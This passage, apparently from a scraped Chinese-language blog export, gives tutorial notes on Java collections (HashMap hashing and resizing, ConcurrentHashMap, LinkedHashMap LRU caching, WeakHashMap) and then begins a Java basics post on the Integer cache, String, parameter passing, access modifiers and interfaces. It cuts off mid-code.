table.l ength); hash = (null != key) ? hash(key) : 0; bucketIndex = indexFor(hash, table.length); &#125; createEntry(hash, key, value, bucketIndex);&#125;void createEntry(int hash, K key, V value, int bucketIndex) &#123; Entry&lt;K,V&gt; e = table[bucketIndex]; // 头插法，链表头部指向新的键值对 table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e); size++;&#125; 123456Entry(int h, K k, V v, Entry&lt;K,V&gt; n) &#123; value = v; next = n; key = k; hash = h;&#125; 0x3.5.4. 确定桶下标 很多操作都需要先确定一个键值对所在的桶下标。 12int hash = hash(key);int i = indexFor(hash, table.length); 0x3.5.4.1 计算 hash 值 1234567891011121314final int hash(Object k) &#123; int h = hashSeed; if (0 != h &amp;&amp; k instanceof String) &#123; return sun.misc.Hashing.stringHash32((String) k); &#125; h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12); return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);&#125; 123public final int hashCode() &#123; return Objects.hashCode(key) ^ Objects.hashCode(value);&#125; 0x3.5.4.2 取模 令 x = 1&lt;&lt;4，即 x 为 2 的 4 次方，它具有以下性质： 12x : 00010000x-1 : 00001111 令一个数 y 与 x-1 做与运算，可以去除 y 位级表示的第 4 位以上数： 123y : 10110010x-1 : 00001111y&amp;(x-1) : 00000010 这个性质和 y 对 x 取模效果是一样的： 123y : 10110010x : 00010000y%x : 00000010 我们知道，位运算的代价比求模运算小的多，因此在进行这种计算时用位运算的话能带来更高的性能。 确定桶下标的最后一步是将 key 的 hash 值对桶个数取模：hash%capacity，如果能保证 capacity 为 2 的 n 次方，那么就可以将这个操作转换为位运算。 123static int indexFor(int h, int length) &#123; return h &amp; (length-1);&#125; 0x3.5.5. 扩容-基本原理 设 HashMap 的 table 长度为 M，需要存储的键值对数量为 N，如果哈希函数满足均匀性的要求，那么每条链表的长度大约为 N/M，因此平均查找次数的复杂度为 O(N/M)。 为了让查找的成本降低，应该尽可能使得 N/M 尽可能小，因此需要保证 M 尽可能大，也就是说 table 要尽可能大。HashMap 采用动态扩容来根据当前的 N 值来调整 M 值，使得空间效率和时间效率都能得到保证。 和扩容相关的参数主要有：capacity、size、threshold 和 load_factor。 参数 含义 capacity table 的容量大小，默认为 16。需要注意的是 capacity 必须保证为 2 的 n 次方。 size 键值对数量。 threshold size 的临界值，当 size 大于等于 threshold 就必须进行扩容操作。 loadFactor 装载因子，table 能够使用的比例，threshold = capacity * loadFactor。 123456789101112131415static final int DEFAULT_INITIAL_CAPACITY = 16;static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;static final float DEFAULT_LOAD_FACTOR = 0.75f;transient Entry[] table;transient int size;int threshold;final float loadFactor;transient int modCount; 从下面的添加元素代码中可以看出，当需要扩容时，令 capacity 为原来的两倍。 123456void addEntry(int hash, K key, V value, int bucketIndex) &#123; Entry&lt;K,V&gt; e = table[bucketIndex]; table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e); if (size++ &gt;= threshold) resize(2 * table.length);&#125; 扩容使用 resize() 实现，需要注意的是，扩容操作同样需要把 oldTable 的所有键值对重新插入 newTable 中，因此这一步是很费时的。 123456789101112131415161718192021222324252627282930void resize(int newCapacity) &#123; Entry[] oldTable = table; int oldCapacity = oldTable.length; if (oldCapacity == MAXIMUM_CAPACITY) &#123; threshold = Integer.MAX_VALUE; return; &#125; Entry[] newTable = new Entry[newCapacity]; transfer(newTable); table = newTable; threshold = (int)(newCapacity * loadFactor);&#125;void transfer(Entry[] newTable) &#123; Entry[] src = table; int newCapacity = newTable.length; for (int j = 0; j &lt; src.length; j++) &#123; Entry&lt;K,V&gt; e = src[j]; if (e != null) &#123; src[j] = null; do &#123; Entry&lt;K,V&gt; next = e.next; int i = indexFor(e.hash, newCapacity); e.next = newTable[i]; newTable[i] = e; e = next; &#125; while (e != null); &#125; &#125;&#125; 0x3.5.6. 扩容-重新计算桶下标 在进行扩容时，需要把键值对重新放到对应的桶上。HashMap 使用了一个特殊的机制，可以降低重新计算桶下标的操作。 假设原数组长度 capacity 为 16，扩容之后 new capacity 为 32： 12capacity : 00010000new capacity : 00100000 对于一个 Key， 它的哈希值如果在第 5 位上为 0，那么取模得到的结果和之前一样； 如果为 1，那么得到的结果为原来的结果 +16。 0x3.5.7. 计算数组容量 HashMap 构造函数允许用户传入的容量不是 2 的 n 次方，因为它可以自动地将传入的容量转换为 2 的 n 次方。 先考虑如何求一个数的掩码，对于 10010000，它的掩码为 11111111，可以使用以下方法得到： 123mask |&#x3D; mask &gt;&gt; 1 11011000mask |&#x3D; mask &gt;&gt; 2 11111110mask |&#x3D; mask &gt;&gt; 4 11111111 mask+1 是大于原始数字的最小的 2 的 n 次方。 12num 10010000mask+1 100000000 以下是 HashMap 中计算数组容量的代码： 123456789static final int tableSizeFor(int cap) &#123; int n = cap - 1; n |= n &gt;&gt;&gt; 1; n |= n &gt;&gt;&gt; 2; n |= n &gt;&gt;&gt; 4; n |= n &gt;&gt;&gt; 8; n |= n &gt;&gt;&gt; 16; return (n &lt; 0) ? 1 : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;&#125; 0x3.5.8. 链表转红黑树 从 JDK 1.8 开始，一个桶存储的链表长度大于 8 时会将链表转换为红黑树。 0x3.5.9. 与 HashTable 的比较 HashTable 使用 synchronized 来进行同步。 HashMap 可以插入键为 null 的 Entry。 HashMap 的迭代器是 fail-fast 迭代器。 HashMap 不能保证随着时间的推移 Map 中的元素次序是不变的。 0x3.6ConcurrentHashMap0x3.6.1. 存储结构 123456static final class HashEntry&lt;K,V&gt; &#123; final int hash; final K key; volatile V value; volatile HashEntry&lt;K,V&gt; next;&#125; ConcurrentHashMap 和 HashMap 实现上类似，最主要的差别是 ConcurrentHashMap 采用了分段锁（Segment），每个分段锁维护着几个桶（HashEntry），多个线程可以同时访问不同分段锁上的桶，从而使其并发度更高（并发度就是 Segment 的个数）。 Segment 继承自 ReentrantLock。 1234567891011121314151617static final class Segment&lt;K,V&gt; extends ReentrantLock implements Serializable &#123; private static final long serialVersionUID = 2249069246763182397L; static final int MAX_SCAN_RETRIES = Runtime.getRuntime().availableProcessors() &gt; 1 ? 64 : 1; transient volatile HashEntry&lt;K,V&gt;[] table; transient int count; transient int modCount; transient int threshold; final float loadFactor;&#125; 1final Segment&lt;K,V&gt;[] segments; 默认的并发级别为 16，也就是说默认创建 16 个 Segment。 1static final int DEFAULT_CONCURRENCY_LEVEL = 16; 0x3.6.2. size 操作 每个 Segment 维护了一个 count 变量来统计该 Segment 中的键值对个数。 12345/** * The number of elements. Accessed only either within locks * or among other volatile reads that maintain visibility. */transient int count; 在执行 size 操作时，需要遍历所有 Segment 然后把 count 累计起来。 ConcurrentHashMap 在执行 size 操作时先尝试不加锁，如果连续两次不加锁操作得到的结果一致，那么可以认为这个结果是正确的。 尝试次数使用 RETRIES_BEFORE_LOCK 定义，该值为 2，retries 初始值为 -1，因此尝试次数为 3。 如果尝试的次数超过 3 次，就需要对每个 Segment 加锁。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/** * Number of unsynchronized retries in size and containsValue * methods before resorting to locking. This is used to avoid * unbounded retries if tables undergo continuous modification * which would make it impossible to obtain an accurate result. */static final int RETRIES_BEFORE_LOCK = 2;public int size() &#123; // Try a few times to get accurate count. On failure due to // continuous async changes in table, resort to locking. final Segment&lt;K,V&gt;[] segments = this.segments; int size; boolean overflow; // true if size overflows 32 bits long sum; // sum of modCounts long last = 0L; // previous sum int retries = -1; // first iteration isn't retry try &#123; for (;;) &#123; // 超过尝试次数，则对每个 Segment 加锁 if (retries++ == RETRIES_BEFORE_LOCK) &#123; for (int j = 0; j &lt; segments.length; ++j) ensureSegment(j).lock(); // force creation &#125; sum = 0L; size = 0; overflow = false; for (int j = 0; j &lt; segments.length; ++j) &#123; Segment&lt;K,V&gt; seg = segmentAt(segments, j); if (seg != null) &#123; sum += seg.modCount; int c = seg.count; if (c &lt; 0 || (size += c) &lt; 0) overflow = true; &#125; &#125; // 连续两次得到的结果一致，则认为这个结果是正确的 if (sum == last) break; last = sum; &#125; &#125; finally &#123; if (retries &gt; RETRIES_BEFORE_LOCK) &#123; for (int j = 0; j &lt; segments.length; ++j) segmentAt(segments, j).unlock(); &#125; &#125; return overflow ? Integer.MAX_VALUE : size;&#125; ### 0x3.6.3. JDK 1.8 的改动 JDK 1.7 使用分段锁机制来实现并发更新操作，核心类为 Segment，它继承自重入锁 ReentrantLock，并发度与 Segment 数量相等。 JDK 1.8 使用了 CAS 操作来支持更高的并发度，在 CAS 操作失败时使用内置锁 synchronized。 并且 JDK 1.8 的实现也在链表过长时会转换为红黑树。 0x3.7LinkedHashMap0x3.7.1存储结构 继承自 HashMap，因此具有和 HashMap 一样的快速查找特性。 1public class LinkedHashMap&lt;K,V&gt; extends HashMap&lt;K,V&gt; implements Map&lt;K,V&gt; 内部维护了一个双向链表，用来维护插入顺序或者 LRU 顺序。 123456789/** * The head (eldest) of the doubly linked list. */transient LinkedHashMap.Entry&lt;K,V&gt; head;/** * The tail (youngest) of the doubly linked list. */transient LinkedHashMap.Entry&lt;K,V&gt; tail; accessOrder 决定了顺序，默认为 false，此时维护的是插入顺序。 1final boolean accessOrder; LinkedHashMap 最重要的是以下用于维护顺序的函数，它们会在 put、get 等方法中调用。 12void afterNodeAccess(Node&lt;K,V&gt; p) &#123; &#125;void afterNodeInsertion(boolean evict) &#123; &#125; 0x3.7.2afterNodeAccess() 当一个节点被访问时，如果 accessOrder 为 true，则会将该节点移到链表尾部。也就是说指定为 LRU 顺序之后，在每次访问一个节点时，会将这个节点移到链表尾部，保证链表尾部是最近访问的节点，那么链表首部就是最近最久未使用的节点。 123456789101112131415161718192021222324void afterNodeAccess(Node&lt;K,V&gt; e) &#123; // move node to last LinkedHashMap.Entry&lt;K,V&gt; last; if (accessOrder &amp;&amp; (last = tail) != e) &#123; LinkedHashMap.Entry&lt;K,V&gt; p = (LinkedHashMap.Entry&lt;K,V&gt;)e, b = p.before, a = p.after; p.after = null; if (b == null) head = a; else b.after = a; if (a != null) a.before = b; else last = b; if (last == null) head = p; else &#123; p.before = last; last.after = p; &#125; tail = p; ++modCount; &#125;&#125; 0x3.7.3afterNodeInsertion() 在 put 等操作之后执行，当 removeEldestEntry() 方法返回 true 时会移除最晚的节点，也就是链表首部节点 first。 evict 只有在构建 Map 的时候才为 false，在这里为 true。 1234567void afterNodeInsertion(boolean evict) &#123; // possibly remove eldest LinkedHashMap.Entry&lt;K,V&gt; first; if (evict &amp;&amp; (first = head) != null &amp;&amp; removeEldestEntry(first)) &#123; K key = first.key; removeNode(hash(key), key, null, false, true); &#125;&#125; removeEldestEntry() 默认为 false，如果需要让它为 true，需要继承 LinkedHashMap 并且覆盖这个方法的实现，这在实现 LRU 的缓存中特别有用，通过移除最近最久未使用的节点，从而保证缓存空间足够，并且缓存的数据都是热点数据。 123protected boolean removeEldestEntry(Map.Entry&lt;K,V&gt; eldest) &#123; return false;&#125; 0x3.7.4LRU 缓存 以下是使用 LinkedHashMap 实现的一个 LRU 缓存： 设定最大缓存空间 MAX_ENTRIES 为 3； 使用 LinkedHashMap 的构造函数将 accessOrder 设置为 true，开启 LRU 顺序； 覆盖 removeEldestEntry() 方法实现，在节点多于 MAX_ENTRIES 就会将最近最久未使用的数据移除。 1234567891011class LRUCache&lt;K, V&gt; extends LinkedHashMap&lt;K, V&gt; &#123; private static final int MAX_ENTRIES = 3; protected boolean removeEldestEntry(Map.Entry eldest) &#123; return size() &gt; MAX_ENTRIES; &#125; LRUCache() &#123; super(MAX_ENTRIES, 0.75f, true); &#125;&#125; 123456789public static void main(String[] args) &#123; LRUCache&lt;Integer, String&gt; cache = new LRUCache&lt;&gt;(); cache.put(1, \"a\"); cache.put(2, \"b\"); cache.put(3, \"c\"); cache.get(1); cache.put(4, \"d\"); System.out.println(cache.keySet());&#125; 1[3, 1, 4] 0x3.8WeakHashMap0x3.8.1存储结构 WeakHashMap 的 Entry 继承自 WeakReference，被 WeakReference 关联的对象在下一次垃圾回收时会被回收。 WeakHashMap 主要用来实现缓存，通过使用 WeakHashMap 来引用缓存对象，由 JVM 对这部分缓存进行回收。 1private static class Entry&lt;K,V&gt; extends WeakReference&lt;Object&gt; implements Map.Entry&lt;K,V&gt; 0x3.8.2ConcurrentCache Tomcat 中的 ConcurrentCache 使用了 WeakHashMap 来实现缓存功能。 ConcurrentCache 采取的是分代缓存： 经常使用的对象放入 eden 中，eden 使用 ConcurrentHashMap 实现，不用担心会被回收（伊甸园）； 不常用的对象放入 longterm，longterm 使用 WeakHashMap 实现，这些老对象会被垃圾收集器回收。 当调用 get() 方法时，会先从 eden 区获取，如果没有找到的话再到 longterm 获取，当从 longterm 获取到就把对象放入 eden 中，从而保证经常被访问的节点不容易被回收。 当调用 put() 方法时，如果 eden 的大小超过了 size，那么就将 eden 中的所有对象都放入 longterm 中，利用虚拟机回收掉一部分不经常使用的对象。 1234567891011121314151617181920212223242526272829303132public final class ConcurrentCache&lt;K, V&gt; &#123; private final int size; private final Map&lt;K, V&gt; eden; private final Map&lt;K, V&gt; longterm; public ConcurrentCache(int size) &#123; this.size = size; this.eden = new ConcurrentHashMap&lt;&gt;(size); this.longterm = new WeakHashMap&lt;&gt;(size); &#125; public V get(K k) &#123; V v = this.eden.get(k); if (v == null) &#123; v = this.longterm.get(k); if (v != null) this.eden.put(k, v); &#125; return v; &#125; public void put(K k, V v) &#123; if (this.eden.size() &gt;= size) &#123; this.longterm.putAll(this.eden); this.eden.clear(); &#125; this.eden.put(k, v); &#125;&#125; 参考资料 Eckel B. Java 编程思想 [M]. 机械工业出版社, 2002. Java Collection Framework Iterator 模式 Java 8 系列之重新认识 HashMap What is difference between HashMap and Hashtable in Java? Java 集合之 HashMap The principle of ConcurrentHashMap analysis 探索 ConcurrentHashMap 高并发性的实现机制 HashMap 相关面试题及其解答 Java 集合细节（二）：asList 的缺陷 Java Collection Framework – The LinkedList Class","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"java容器","slug":"java容器","permalink":"https://blog.cfyqy.com/tags/java%E5%AE%B9%E5%99%A8/"}]},{"title":"java基础","slug":"Java 基础","date":"2019-06-21T12:32:00.000Z","updated":"2020-04-13T08:14:26.594Z","comments":true,"path":"article/b8b0eacd.html","link":"","permalink":"https://blog.cfyqy.com/article/b8b0eacd.html","excerpt":"java入门的一些基础知识","text":"java入门的一些基础知识 转载https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%9F%BA%E7%A1%80.md 0x1数据类型** 0x1.1基本类型** byte/8 char/16 short/16 int/32 float/32 long/64 double/64 boolean/~ boolean 只有两个值：true、false，可以使用 1 bit 来存储，但是具体大小没有明确规定。JVM 会在编译时期将 boolean 类型的数据转换为 int，使用 1 来表示 true，0 表示 false。JVM 支持 boolean 数组，但是是通过读写 byte 数组来实现的。 Primitive Data Types The Java® Virtual Machine Specification 0x1.2包装类型 基本类型都有对应的包装类型，基本类型与其对应的包装类型之间的赋值使用自动装箱与拆箱完成。 12Integer x = 2; // 装箱int y = x; // 拆箱 0x1.3缓存池 new Integer(123) 与 Integer.valueOf(123) 的区别在于： new Integer(123) 每次都会新建一个对象； Integer.valueOf(123) 会使用缓存池中的对象，多次调用会取得同一个对象的引用。 123456Integer x = new Integer(123);Integer y = new Integer(123);System.out.println(x == y); // falseInteger z = Integer.valueOf(123);Integer k = Integer.valueOf(123);System.out.println(z == k); // true valueOf() 方法的实现比较简单，就是先判断值是否在缓存池中，如果在的话就直接返回缓存池的内容。 12345public static Integer valueOf(int i) &#123; if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high) return IntegerCache.cache[i + (-IntegerCache.low)]; return new Integer(i);&#125; 在 Java 8 中，Integer 缓存池的大小默认为 -128~127。 1234567891011121314151617181920212223242526272829static final int low = -128;static final int high;static final Integer cache[];static &#123; // high value may be configured by property int h = 127; String integerCacheHighPropValue = sun.misc.VM.getSavedProperty(\"java.lang.Integer.IntegerCache.high\"); if (integerCacheHighPropValue != null) &#123; try &#123; int i = parseInt(integerCacheHighPropValue); i = Math.max(i, 127); // Maximum array size is Integer.MAX_VALUE h = Math.min(i, Integer.MAX_VALUE - (-low) -1); &#125; catch( NumberFormatException nfe) &#123; // If the property cannot be parsed into an int, ignore it. &#125; &#125; high = h; cache = new Integer[(high - low) + 1]; int j = low; for(int k = 0; k &lt; cache.length; k++) cache[k] = new Integer(j++); // range [-128, 127] must be interned (JLS7 5.1.7) assert IntegerCache.high &gt;= 127;&#125; 编译器会在自动装箱过程调用 valueOf() 方法，因此多个值相同且值在缓存池范围内的 Integer 实例使用自动装箱来创建，那么就会引用相同的对象。 123Integer m = 123;Integer n = 123;System.out.println(m == n); // true 基本类型对应的缓冲池如下： boolean values true and false all byte values short values between -128 and 127 int values between -128 and 127 char in the range \\u0000 to \\u007F 在使用这些基本类型对应的包装类型时，如果该数值范围在缓冲池范围内，就可以直接使用缓冲池中的对象。 在 jdk 1.8 所有的数值类缓冲池中，Integer 的缓冲池 IntegerCache 很特殊，这个缓冲池的下界是 - 128，上界默认是 127，但是这个上界是可调的，在启动 jvm 的时候，通过 -XX:AutoBoxCacheMax=&lt;size&gt; 来指定这个缓冲池的大小，该选项在 JVM 初始化的时候会设定一个名为 java.lang.IntegerCache.high 系统属性，然后 IntegerCache 初始化的时候就会读取该系统属性来决定上界。 StackOverflow : Differences between new Integer(123), Integer.valueOf(123) and just 123 0x2String0x2.1概览 String 被声明为 final，因此它不可被继承。 在 Java 8 中，String 内部使用 char 数组存储数据。 12345public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123; /** The value is used for character storage. */ private final char value[];&#125; 在 Java 9 之后，String 类的实现改用 byte 数组存储字符串，同时使用 coder 来标识使用了哪种编码。 12345678public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123; /** The value is used for character storage. */ private final byte[] value; /** The identifier of the encoding used to encode the bytes in &#123;@code value&#125;. */ private final byte coder;&#125; value 数组被声明为 final，这意味着 value 数组初始化之后就不能再引用其它数组。并且 String 内部没有改变 value 数组的方法，因此可以保证 String 不可变。 0x2.2不可变的好处 1. 可以缓存 hash 值 因为 String 的 hash 值经常被使用，例如 String 用做 HashMap 的 key。不可变的特性可以使得 hash 值也不可变，因此只需要进行一次计算。 2. String Pool 的需要 如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。 3. 安全性 String 经常作为参数，String 不可变性可以保证参数不可变。例如在作为网络连接参数的情况下如果 String 是可变的，那么在网络连接过程中，String 被改变，改变 String 对象的那一方以为现在连接的是其它主机，而实际情况却不一定是。 4. 线程安全 String 不可变性天生具备线程安全，可以在多个线程中安全地使用。 Program Creek : Why String is immutable in Java? 0x2.3String, StringBuffer and StringBuilder 1. 可变性 String 不可变 StringBuffer 和 StringBuilder 可变 2. 线程安全 String 不可变，因此是线程安全的 StringBuilder 不是线程安全的 StringBuffer 是线程安全的，内部使用 synchronized 进行同步 StackOverflow : String, StringBuffer, and StringBuilder 0x2.4String Pool 字符串常量池（String Pool）保存着所有字符串字面量（literal strings），这些字面量在编译时期就确定。不仅如此，还可以使用 String 的 intern() 方法在运行过程中将字符串添加到 String Pool 中。 当一个字符串调用 intern() 方法时，如果 String Pool 中已经存在一个字符串和该字符串值相等（使用 equals() 方法进行确定），那么就会返回 String Pool 中字符串的引用；否则，就会在 String Pool 中添加一个新的字符串，并返回这个新字符串的引用。 下面示例中，s1 和 s2 采用 new String() 的方式新建了两个不同字符串，而 s3 和 s4 是通过 s1.intern() 方法取得一个字符串引用。intern() 首先把 s1 引用的字符串放到 String Pool 中，然后返回这个字符串引用。因此 s3 和 s4 引用的是同一个字符串。 123456String s1 = new String(\"aaa\");String s2 = new String(\"aaa\");System.out.println(s1 == s2); // falseString s3 = s1.intern();String s4 = s1.intern();System.out.println(s3 == s4); // true 如果是采用 “bbb” 这种字面量的形式创建字符串，会自动地将字符串放入 String Pool 中。 123String s5 = \"bbb\";String s6 = \"bbb\";System.out.println(s5 == s6); // true 在 Java 7 之前，String Pool 被放在运行时常量池中，它属于永久代。而在 Java 7，String Pool 被移到堆中。这是因为永久代的空间有限，在大量使用字符串的场景下会导致 OutOfMemoryError 错误。 StackOverflow : What is String interning? 深入解析 String#intern 0x2.5new String(“abc”) 使用这种方式一共会创建两个字符串对象（前提是 String Pool 中还没有 “abc” 字符串对象）。 “abc” 属于字符串字面量，因此编译时期会在 String Pool 中创建一个字符串对象，指向这个 “abc” 字符串字面量； 而使用 new 的方式会在堆中创建一个字符串对象。 创建一个测试类，其 main 方法中使用这种方式来创建字符串对象。 12345public class NewStringTest &#123; public static void main(String[] args) &#123; String s = new String(\"abc\"); &#125;&#125; 使用 javap -verbose 进行反编译，得到以下内容： 123456789101112131415161718192021// ...Constant pool:// ... #2 = Class #18 // java/lang/String #3 = String #19 // abc// ... #18 = Utf8 java/lang/String #19 = Utf8 abc// ... public static void main(java.lang.String[]); descriptor: ([Ljava/lang/String;)V flags: ACC_PUBLIC, ACC_STATIC Code: stack=3, locals=2, args_size=1 0: new #2 // class java/lang/String 3: dup 4: ldc #3 // String abc 6: invokespecial #4 // Method java/lang/String.\"&lt;init&gt;\":(Ljava/lang/String;)V 9: astore_1// ... 在 Constant Pool 中，#19 存储这字符串字面量 “abc”，#3 是 String Pool 的字符串对象，它指向 #19 这个字符串字面量。在 main 方法中，0: 行使用 new #2 在堆中创建一个字符串对象，并且使用 ldc #3 将 String Pool 中的字符串对象作为 String 构造函数的参数。 以下是 String 构造函数的源码，可以看到，在将一个字符串对象作为另一个字符串对象的构造函数参数时，并不会完全复制 value 数组内容，而是都会指向同一个 value 数组。 1234public String(String original) &#123; this.value = original.value; this.hash = original.hash;&#125; 0x3运算0x3.1参数传递 Java 的参数是以值传递的形式传入方法中，而不是引用传递。 以下代码中 Dog dog 的 dog 是一个指针，存储的是对象的地址。在将一个参数传入一个方法时，本质上是将对象的地址以值的方式传递到形参中。因此在方法中使指针引用其它对象，那么这两个指针此时指向的是完全不同的对象，在一方改变其所指向对象的内容时对另一方没有影响。 1234567891011121314151617181920public class Dog &#123; String name; Dog(String name) &#123; this.name = name; &#125; String getName() &#123; return this.name; &#125; void setName(String name) &#123; this.name = name; &#125; String getObjectAddress() &#123; return super.toString(); &#125;&#125; 12345678910111213141516public class PassByValueExample &#123; public static void main(String[] args) &#123; Dog dog = new Dog(\"A\"); System.out.println(dog.getObjectAddress()); // Dog@4554617c func(dog); System.out.println(dog.getObjectAddress()); // Dog@4554617c System.out.println(dog.getName()); // A &#125; private static void func(Dog dog) &#123; System.out.println(dog.getObjectAddress()); // Dog@4554617c dog = new Dog(\"B\"); System.out.println(dog.getObjectAddress()); // Dog@74a14482 System.out.println(dog.getName()); // B &#125;&#125; 如果在方法中改变对象的字段值会改变原对象该字段值，因为改变的是同一个地址指向的内容。 1234567891011class PassByValueExample &#123; public static void main(String[] args) &#123; Dog dog = new Dog(\"A\"); func(dog); System.out.println(dog.getName()); // B &#125; private static void func(Dog dog) &#123; dog.setName(\"B\"); &#125;&#125; StackOverflow: Is Java “pass-by-reference” or “pass-by-value”? 0x3.2float 与 double Java 不能隐式执行向下转型，因为这会使得精度降低。 1.1 字面量属于 double 类型，不能直接将 1.1 直接赋值给 float 变量，因为这是向下转型。 1// float f = 1.1; 1.1f 字面量才是 float 类型。 1float f = 1.1f; 0x3.3隐式类型转换 因为字面量 1 是 int 类型，它比 short 类型精度要高，因此不能隐式地将 int 类型下转型为 short 类型。 12short s1 = 1;// s1 = s1 + 1; 但是使用 += 或者 ++ 运算符可以执行隐式类型转换。 12s1 += 1;// s1++; 上面的语句相当于将 s1 + 1 的计算结果进行了向下转型： 1s1 = (short) (s1 + 1); StackOverflow : Why don’t Java’s +=, -=, *=, /= compound assignment operators require casting? 0x3.4switch 从 Java 7 开始，可以在 switch 条件判断语句中使用 String 对象。 123456789String s = \"a\";switch (s) &#123; case \"a\": System.out.println(\"aaa\"); break; case \"b\": System.out.println(\"bbb\"); break;&#125; switch 不支持 long，是因为 switch 的设计初衷是对那些只有少数的几个值进行等值判断，如果值过于复杂，那么还是用 if 比较合适。 123456789// long x = 111;// switch (x) &#123; // Incompatible types. Found: 'long', required: 'char, byte, short, int, Character, Byte, Short, Integer, String, or an enum'// case 111:// System.out.println(111);// break;// case 222:// System.out.println(222);// break;// &#125; StackOverflow : Why can’t your switch statement data type be long, Java? 0x4继承0x4.1访问权限Java 中有三个访问权限修饰符：private、protected 以及 public，如果不加访问修饰符，表示包级可见。 可以对类或类中的成员（字段以及方法）加上访问修饰符。 类可见表示其它类可以用这个类创建实例对象。 成员可见表示其它类可以用这个类的实例对象访问到该成员； protected 用于修饰成员，表示在继承体系中成员对于子类可见，但是这个访问修饰符对于类没有意义。 设计良好的模块会隐藏所有的实现细节，把它的 API 与它的实现清晰地隔离开来。模块之间只通过它们的 API 进行通信，一个模块不需要知道其他模块的内部工作情况，这个概念被称为信息隐藏或封装。因此访问权限应当尽可能地使每个类或者成员不被外界访问。 如果子类的方法重写了父类的方法，那么子类中该方法的访问级别不允许低于父类的访问级别。这是为了确保可以使用父类实例的地方都可以使用子类实例，也就是确保满足里氏替换原则。 字段决不能是公有的，因为这么做的话就失去了对这个字段修改行为的控制，客户端可以对其随意修改。例如下面的例子中，AccessExample 拥有 id 公有字段，如果在某个时刻，我们想要使用 int 存储 id 字段，那么就需要修改所有的客户端代码。 123public class AccessExample &#123; public String id;&#125; 可以使用公有的 getter 和 setter 方法来替换公有字段，这样的话就可以控制对字段的修改行为。 123456789101112public class AccessExample &#123; private int id; public String getId() &#123; return id + \"\"; &#125; public void setId(String id) &#123; this.id = Integer.valueOf(id); &#125;&#125; 但是也有例外，如果是包级私有的类或者私有的嵌套类，那么直接暴露成员不会有特别大的影响。 12345678910111213141516public class AccessWithInnerClassExample &#123; private class InnerClass &#123; int x; &#125; private InnerClass innerClass; public AccessWithInnerClassExample() &#123; innerClass = new InnerClass(); &#125; public int getValue() &#123; return innerClass.x; // 直接访问 &#125;&#125; 0x4.2抽象类与接口1. 抽象类 抽象类和抽象方法都使用 abstract 关键字进行声明。如果一个类中包含抽象方法，那么这个类必须声明为抽象类。 抽象类和普通类最大的区别是，抽象类不能被实例化，需要继承抽象类才能实例化其子类。 1234567891011public abstract class AbstractClassExample &#123; protected int x; private int y; public abstract void func1(); public void func2() &#123; System.out.println(\"func2\"); &#125;&#125; 123456public class AbstractExtendClassExample extends AbstractClassExample &#123; @Override public void func1() &#123; System.out.println(\"func1\"); &#125;&#125; 123// AbstractClassExample ac1 = new AbstractClassExample(); // 'AbstractClassExample' is abstract; cannot be instantiatedAbstractClassExample ac2 = new AbstractExtendClassExample();ac2.func1(); 2. 接口 接口是抽象类的延伸，在 Java 8 之前，它可以看成是一个完全抽象的类，也就是说它不能有任何的方法实现。 从 Java 8 开始，接口也可以拥有默认的方法实现，这是因为不支持默认方法的接口的维护成本太高了。在 Java 8 之前，如果一个接口想要添加新的方法，那么要修改所有实现了该接口的类。 接口的成员（字段 + 方法）默认都是 public 的，并且不允许定义为 private 或者 protected。 接口的字段默认都是 static 和 final 的。 123456789101112131415public interface InterfaceExample &#123; void func1(); default void func2()&#123; System.out.println(\"func2\"); &#125; int x = 123; // int y; // Variable 'y' might not have been initialized public int z = 0; // Modifier 'public' is redundant for interface fields // private int k = 0; // Modifier 'private' not allowed here // protected int l = 0; // Modifier 'protected' not allowed here // private void fun3(); // Modifier 'private' not allowed here&#125; 123456public class InterfaceImplementExample implements InterfaceExample &#123; @Override public void func1() &#123; System.out.println(\"func1\"); &#125;&#125; 1234// InterfaceExample ie1 = new InterfaceExample(); // 'InterfaceExample' is abstract; cannot be instantiatedInterfaceExample ie2 = new InterfaceImplementExample();ie2.func1();System.out.println(InterfaceExample.x); 3. 比较 从设计层面上看，抽象类提供了一种 IS-A 关系，那么就必须满足里式替换原则，即子类对象必须能够替换掉所有父类对象。而接口更像是一种 LIKE-A 关系，它只是提供一种方法实现契约，并不要求接口和实现接口的类具有 IS-A 关系。 从使用上来看，一个类可以实现多个接口，但是不能继承多个抽象类。 接口的字段只能是 static 和 final 类型的，而抽象类的字段没有这种限制。 接口的成员只能是 public 的，而抽象类的成员可以有多种访问权限。 4. 使用选择 使用接口： 需要让不相关的类都实现一个方法，例如不相关的类都可以实现 Compareable 接口中的 compareTo() 方法； 需要使用多重继承。 使用抽象类： 需要在几个相关的类中共享代码。 需要能控制继承来的成员的访问权限，而不是都为 public。 需要继承非静态和非常量字段。 在很多情况下，接口优先于抽象类。因为接口没有抽象类严格的类层次结构要求，可以灵活地为一个类添加行为。并且从 Java 8 开始，接口也可以有默认的方法实现，使得修改接口的成本也变的很低。 Abstract Methods and Classes 深入理解 abstract class 和 interface When to Use Abstract Class and Interface 0x4.3super 访问父类的构造函数：可以使用 super() 函数访问父类的构造函数，从而委托父类完成一些初始化的工作。 访问父类的成员：如果子类重写了父类的某个方法，可以通过使用 super 关键字来引用父类的方法实现。 1234567891011121314public class SuperExample &#123; protected int x; protected int y; public SuperExample(int x, int y) &#123; this.x = x; this.y = y; &#125; public void func() &#123; System.out.println(\"SuperExample.func()\"); &#125;&#125; 123456789101112131415public class SuperExtendExample extends SuperExample &#123; private int z; public SuperExtendExample(int x, int y, int z) &#123; super(x, y); this.z = z; &#125; @Override public void func() &#123; 